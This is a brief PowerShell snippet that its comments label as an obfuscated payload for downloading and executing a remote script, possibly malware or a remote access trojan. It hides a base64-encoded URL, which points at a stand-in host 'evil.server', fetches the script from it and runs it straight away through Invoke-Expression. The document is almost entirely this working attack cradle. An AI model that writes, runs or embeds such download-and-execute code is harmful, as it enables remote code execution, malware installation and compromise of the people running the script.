#obfuscated PowerShell payload to download and execute a remote script
# This code fetches a script from a malicious server — the actual payload could be malware, ransomware, or a RAT (remote access trojan).


$e=[Text.Encoding]::UTF8
$u='aHR0cDovL2V2aWwuc2VydmVyL3JhdC5zY3JpcHQ='
$w=New-Object Net.WebClient
$w.DownloadString(($e.GetString([Convert]::FromBase64String($u)))|iex
